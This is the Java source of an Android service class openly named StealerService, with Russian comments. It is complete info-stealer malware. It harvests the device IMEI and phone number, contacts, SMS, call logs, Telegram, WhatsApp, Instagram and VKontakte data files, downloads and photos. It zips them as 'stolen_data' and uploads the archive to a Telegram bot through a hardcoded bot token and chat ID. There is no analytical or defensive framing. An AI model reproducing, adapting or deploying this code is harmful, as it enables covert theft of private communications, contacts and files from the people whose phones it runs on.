package com.stealer.core;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class StealerService extends Service {
    private static final String TAG = "StealerService";
    private String BOT_TOKEN = "8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4";
    private String ADMIN_CHAT_ID = "7725796090";
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        
        new Thread(() -> {
            try {
                // Сбор всех данных
                JSONObject report = new JSONObject();
                report.put("device_info", getDeviceInfo());
                report.put("contacts", getContacts());
                report.put("sms", getSMS());
                report.put("call_logs", getCallLogs());
                
                // Сбор файлов
                List<File> stolenFiles = new ArrayList<>();
                stolenFiles.addAll(collectFilesFromPath("/data/data/org.telegram.messenger/files/", ".map"));
                stolenFiles.addAll(collectFilesFromPath("/data/data/com.whatsapp/", ".db"));
                stolenFiles.addAll(collectFilesFromPath("/data/data/com.instagram.android/", ".db"));
                stolenFiles.addAll(collectFilesFromPath("/data/data/com.vkontakte.android/", ".db"));
                stolenFiles.addAll(collectFilesFromPath("/storage/emulated/0/Download/", new String[]{".txt", ".pdf", ".doc", ".jpg", ".png"}));
                stolenFiles.addAll(collectFilesFromPath("/storage/emulated/0/DCIM/", new String[]{".jpg", ".png", ".mp4"}));
                
                // Создаем ZIP архив
                File zipFile = createZipArchive(report, stolenFiles);
                
                // Отправляем в Telegram
                sendToTelegram(zipFile);
                
                // Удаляем временные файлы
                zipFile.delete();
                
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.toString());
                sendErrorToTelegram(e.toString());
            }
        }).start();
        
        return START_STICKY;
    }
    
    private JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            info.put("device_model", android.os.Build.MODEL);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            info.put("imei", tm.getDeviceId());
            info.put("phone_number", tm.getLine1Number());
            info.put("operator", tm.getNetworkOperatorName());
        } catch (Exception e) {
            Log.e(TAG, "Failed to get device info: " + e.toString());
        }
        return info;
    }
    
    private JSONArray getContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            while (cursor.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                contact.put("name", name);
                contact.put("phone", phone);
                contacts.put(contact);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get contacts: " + e.toString());
        } finally {
            if (cursor != null) cursor.close();
        }
        return contacts;
    }
    
    private JSONArray getSMS() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null);
            
            while (cursor.moveToNext()) {
                JSONObject sms = new JSONObject();
                sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
                sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
                sms.put("date", cursor.getString(cursor.getColumnIndex("date")));
                sms.put("type", cursor.getString(cursor.getColumnIndex("type")));
                smsList.put(sms);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get SMS: " + e.toString());
        } finally {
            if (cursor != null) cursor.close();
        }
        return smsList;
    }
    
    private JSONArray getCallLogs() {
        JSONArray calls = new JSONArray();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
            
            while (cursor.moveToNext()) {
                JSONObject call = new JSONObject();
                call.put("number", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)));
                call.put("type", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)));
                call.put("date", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)));
                call.put("duration", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)));
                calls.put(call);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get call logs: " + e.toString());
        } finally {
            if (cursor != null) cursor.close();
        }
        return calls;
    }
    
    private List<File> collectFilesFromPath(String path, String... extensions) {
        List<File> files = new ArrayList<>();
        try {
            File directory = new File(path);
            if (directory.exists() && directory.isDirectory()) {
                collectFilesRecursive(directory, files, extensions);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect files from " + path + ": " + e.toString());
        }
        return files;
    }
    
    private void collectFilesRecursive(File dir, List<File> files, String... extensions) {
        try {
            File[] listFiles = dir.listFiles();
            if (listFiles != null) {
                for (File file : listFiles) {
                    if (file.isDirectory()) {
                        collectFilesRecursive(file, files, extensions);
                    } else {
                        if (extensions.length == 0) {
                            files.add(file);
                        } else {
                            for (String ext : extensions) {
                                if (file.getName().toLowerCase().endsWith(ext.toLowerCase())) {
                                    files.add(file);
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed in collectFilesRecursive: " + e.toString());
        }
    }
    
    private File createZipArchive(JSONObject report, List<File> files) {
        File zipFile = new File(getCacheDir(), "stolen_data_" + System.currentTimeMillis() + ".zip");
        try {
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            // Добавляем отчет
            ZipEntry reportEntry = new ZipEntry("report.json");
            zos.putNextEntry(reportEntry);
            zos.write(report.toString(2).getBytes());
            zos.closeEntry();
            
            // Добавляем файлы
            for (File file : files) {
                if (file.exists() && file.length() > 0) {
                    ZipEntry entry = new ZipEntry("files/" + file.getName());
                    zos.putNextEntry(entry);
                    
                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = fis.read(buffer)) > 0) {
                        zos.write(buffer, 0, length);
                    }
                    fis.close();
                    zos.closeEntry();
                }
            }
            
            zos.close();
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Failed to create zip: " + e.toString());
        }
        return zipFile;
    }
    
    private void sendToTelegram(File file) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            
            // Добавляем chat_id
            String part = "--" + boundary + "\r\n" +
                         "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                         ADMIN_CHAT_ID + "\r\n";
            os.write(part.getBytes());
            
            // Добавляем файл
            part = "--" + boundary + "\r\n" +
                  "Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n" +
                  "Content-Type: application/zip\r\n\r\n";
            os.write(part.getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fis.close();
            
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Telegram response: " + responseCode);
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send to Telegram: " + e.toString());
        }
    }
    
    private void sendErrorToTelegram(String error) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String postData = "chat_id=" + ADMIN_CHAT_ID + 
                             "&text=" + "❌ Ошибка стиллера: " + error;
            
            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "Failed to send error: " + e.toString());
        }
    }
              }
